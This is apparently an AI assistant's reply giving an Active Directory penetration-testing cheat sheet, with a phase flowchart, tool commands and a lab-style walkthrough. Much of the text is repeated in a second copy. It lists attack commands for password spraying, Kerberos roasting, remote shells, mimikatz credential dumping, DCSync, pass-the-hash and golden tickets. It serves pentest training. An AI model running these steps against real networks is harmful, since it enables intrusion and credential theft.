
[Scan]
   ↓
[Identify AD]
   ↓
[Enumerate]
   ↓
[Get Creds]
   ↓
[Foothold]
   ↓
[Enumerate Internally]
   ↓
[Privilege Escalation]
   ↓
[Lateral Movement]
   ↓
[Domain Dominance]
   ↓
   ↺ (loop until DA)


Good — now we’ll turn this into a **complete operator-grade reference pack** you can actually use mid-engagement.

I’ll give you **3 things combined**:

1. 🧠 **Visual Mind Graph (mental map)**
    
2. 🧰 **Phase-by-phase Tool Cheat Sheet (mapped to decisions)**
    
3. 🎯 **Real-world attack walkthrough (how pros think step-by-step)**
    

---

# 🧠 1. MASTER VISUAL MIND GRAPH (PRINT THIS IN YOUR HEAD)

## 🔁 Core Loop (THIS is AD pentesting)

```
[Scan]
   ↓
[Identify AD]
   ↓
[Enumerate]
   ↓
[Get Creds]
   ↓
[Foothold]
   ↓
[Enumerate Internally]
   ↓
[Privilege Escalation]
   ↓
[Lateral Movement]
   ↓
[Domain Dominance]
   ↓
   ↺ (loop until DA)
```

---

## 🧠 REAL DECISION GRAPH (WHAT YOU WERE MISSING)

```
Nmap Results
   ↓
[445, 389, 88 present?] → YES → AD Environment

   ↓
[Anonymous Access?]
   ├── YES → SMB/LDAP enum
   └── NO → Go to attack surface

   ↓
[Kerberos exposed?]
   ├── YES → AS-REP Roast
   └── NO

   ↓
[Got creds?]
   ├── NO → Password spray / enum more
   └── YES

   ↓
[Where can creds log in?]
   ├── SMB → psexec
   ├── WinRM → evil-winrm
   ├── RDP → GUI access

   ↓
[Inside machine]
   ↓
Run:
   - winPEAS
   - BloodHound

   ↓
[PrivEsc possible?]
   ├── YES → escalate
   └── NO → find creds

   ↓
[Dump creds?]
   ├── YES → reuse
   └── NO

   ↓
[Lateral Movement]
   ↓
[Domain Admin?]
   ├── NO → LOOP AGAIN
   └── YES → DONE
```

---

# 🧰 2. FULL TOOL CHEAT SHEET (BY PHASE)

This is what you wanted: **“when do I use what?”**

---

## 🔍 PHASE 1 — RECON / ENUM (NO CREDS)

### 🎯 Goal: Map domain + find entry points

|Task|Tool|Command|
|---|---|---|
|SMB enum|crackmapexec|`cme smb <target>`|
|Null session|enum4linux|`enum4linux -a <ip>`|
|Shares|smbclient|`smbclient -L //<ip>`|
|LDAP dump|ldapsearch|`ldapsearch -x`|
|User enum|kerbrute|`kerbrute userenum`|

---

## 🔐 PHASE 2 — CREDENTIAL ACCESS

### 🎯 Goal: FIRST credential

---

### 🔥 AS-REP Roasting

```
GetNPUsers.py domain/ -no-pass
```

---

### 🔥 Kerberoasting

```
GetUserSPNs.py domain/user:pass
```

---

### 🔥 Password Spray

```
crackmapexec smb <targets> -u users.txt -p 'Password123'
```

---

### 🔥 SMB Looting

```
smbclient //<ip>/share
```

---

## 💻 PHASE 3 — FOOTHOLD

### 🎯 Goal: Get shell

|Service|Tool|
|---|---|
|SMB|psexec.py|
|WinRM|evil-winrm|
|WMI|wmiexec.py|
|RDP|xfreerdp|

---

## 🧠 PHASE 4 — INTERNAL ENUMERATION

### 🎯 Goal: Find escalation paths

---

### 🔥 MUST USE:

#### winPEAS

```
winPEAS.exe
```

#### BloodHound

```
SharpHound.exe
```

---

### 🔥 Manual checks:

```
whoami /priv
whoami /groups
net user
net group
cmdkey /list
```

---

## 🔺 PHASE 5 — PRIVILEGE ESCALATION

### 🎯 Goal: Become local admin

---

### 🔥 Common attacks:

|Type|Tool|
|---|---|
|Token abuse|JuicyPotato|
|Weak service|winPEAS|
|Cred dump|mimikatz|

---

## 🔁 PHASE 6 — LATERAL MOVEMENT

### 🎯 Goal: Spread access

---

```
crackmapexec smb <targets> -u user -p pass
```

---

### Tools:

- psexec.py
    
- wmiexec.py
    
- evil-winrm
    

---

## 👑 PHASE 7 — DOMAIN DOMINATION

### 🎯 Goal: Own the domain

---

### 🔥 DCSync

```
mimikatz lsadump::dcsync
```

---

### 🔥 Pass-the-Hash

```
psexec.py -hashes
```

---

### 🔥 Golden Ticket

```
mimikatz kerberos::golden
```

---

# 🎯 3. REAL-WORLD WALKTHROUGH (HOW A PRO THINKS)

---

## 🧪 Scenario

You run:

```
nmap -sC -sV -p- 10.10.10.10
```

### Result:

- 88 (Kerberos)
    
- 389 (LDAP)
    
- 445 (SMB)
    

---

## 🧠 Step 1: Identify AD

You instantly think:

> “This is a Domain Controller or domain-joined system.”

---

## 🧠 Step 2: Try Anonymous Enum

```
enum4linux -a 10.10.10.10
```

→ You get usernames

---

## 🧠 Step 3: Attack Kerberos

```
GetNPUsers.py domain/ -no-pass
```

→ BOOM: hash found

---

## 🧠 Step 4: Crack Password

→ You get:

```
user:Password123
```

---

## 🧠 Step 5: Test Access

```
crackmapexec smb 10.10.10.10 -u user -p Password123
```

→ Valid login

---

## 🧠 Step 6: Get Shell

```
evil-winrm
```

---

## 🧠 Step 7: Internal Enum

Run:

```
winPEAS
SharpHound
```

---

## 🧠 Step 8: BloodHound Insight

You see:

```
User → IT Group → Write on Server → Server = Admin
```

---

## 🧠 Step 9: Exploit Path

→ Move laterally  
→ Dump creds

---

## 🧠 Step 10: Domain Admin

```
mimikatz → DCSync
```

---

# ⚡ FINAL MASTER RULE (BURN THIS INTO YOUR HEAD)

You are ALWAYS cycling:

```
ENUM → ACCESS → ESCALATE → MOVE → REPEAT
```

---

# 🧠 HOW TO THINK LIKE A TOP 1% AD PENTESTER

Stop asking:

> “What tool next?”

Start asking:

> “What does my current access allow me to control?”

---




## 🔍 PHASE 1 — RECON / ENUM (NO CREDS)

### 🎯 Goal: Map domain + find entry points

|Task|Tool|Command|
|---|---|---|
|SMB enum|crackmapexec|`cme smb <target>`|
|Null session|enum4linux|`enum4linux -a <ip>`|
|Shares|smbclient|`smbclient -L //<ip>`|
|LDAP dump|ldapsearch|`ldapsearch -x`|
|User enum|kerbrute|`kerbrute userenum`|

---

## 🔐 PHASE 2 — CREDENTIAL ACCESS

### 🎯 Goal: FIRST credential

---

### 🔥 AS-REP Roasting

GetNPUsers.py domain/ -no-pass

---

### 🔥 Kerberoasting

GetUserSPNs.py domain/user:pass

---

### 🔥 Password Spray

crackmapexec smb <targets> -u users.txt -p 'Password123'

---

### 🔥 SMB Looting

smbclient //<ip>/share

---

## 💻 PHASE 3 — FOOTHOLD

### 🎯 Goal: Get shell

|Service|Tool|
|---|---|
|SMB|psexec.py|
|WinRM|evil-winrm|
|WMI|wmiexec.py|
|RDP|xfreerdp|

---

## 🧠 PHASE 4 — INTERNAL ENUMERATION

### 🎯 Goal: Find escalation paths

---

### 🔥 MUST USE:

#### winPEAS

winPEAS.exe

#### BloodHound

SharpHound.exe

---

### 🔥 Manual checks:

whoami /priv  
whoami /groups  
net user  
net group  
cmdkey /list

---

## 🔺 PHASE 5 — PRIVILEGE ESCALATION

### 🎯 Goal: Become local admin

---

### 🔥 Common attacks:

|Type|Tool|
|---|---|
|Token abuse|JuicyPotato|
|Weak service|winPEAS|
|Cred dump|mimikatz|

---

## 🔁 PHASE 6 — LATERAL MOVEMENT

### 🎯 Goal: Spread access

---

crackmapexec smb <targets> -u user -p pass

---

### Tools:

- psexec.py
- wmiexec.py
- evil-winrm

---

## 👑 PHASE 7 — DOMAIN DOMINATION

### 🎯 Goal: Own the domain

---

### 🔥 DCSync

mimikatz lsadump::dcsync

---

### 🔥 Pass-the-Hash

psexec.py -hashes

---

### 🔥 Golden Ticket

mimikatz kerberos::golden

---

# 🎯 3. REAL-WORLD WALKTHROUGH (HOW A PRO THINKS)

---

## 🧪 Scenario

You run:

nmap -sC -sV -p- 10.10.10.10

### Result:

- 88 (Kerberos)
- 389 (LDAP)
- 445 (SMB)

---

## 🧠 Step 1: Identify AD

You instantly think:

> “This is a Domain Controller or domain-joined system.”

---

## 🧠 Step 2: Try Anonymous Enum

enum4linux -a 10.10.10.10

→ You get usernames

---

## 🧠 Step 3: Attack Kerberos

GetNPUsers.py domain/ -no-pass

→ BOOM: hash found

---

## 🧠 Step 4: Crack Password

→ You get:

user:Password123

---

## 🧠 Step 5: Test Access

crackmapexec smb 10.10.10.10 -u user -p Password123

→ Valid login

---

## 🧠 Step 6: Get Shell

evil-winrm

---

## 🧠 Step 7: Internal Enum

Run:

winPEAS  
SharpHound

---

## 🧠 Step 8: BloodHound Insight

You see:

User → IT Group → Write on Server → Server = Admin

---

## 🧠 Step 9: Exploit Path

→ Move laterally  
→ Dump creds

---

## 🧠 Step 10: Domain Admin

mimikatz → DCSync

---

# ⚡ FINAL MASTER RULE (BURN THIS INTO YOUR HEAD)

You are ALWAYS cycling:

ENUM → ACCESS → ESCALATE → MOVE → REPEAT

---

# 🧠 HOW TO THINK LIKE A TOP 1% AD PENTESTER

Stop asking:

> “What tool next?”

Start asking:

> “What does my current access allow me to control?”

---

# 🚀 If you want to go even deeper:

I can give you:

- 🧾 A **printable PDF attack flowchart**
- 🎮 A **TryHackMe / HTB machine solved step-by-step**
- 🧬 A **BloodHound attack path breakdown (visual reasoning training)**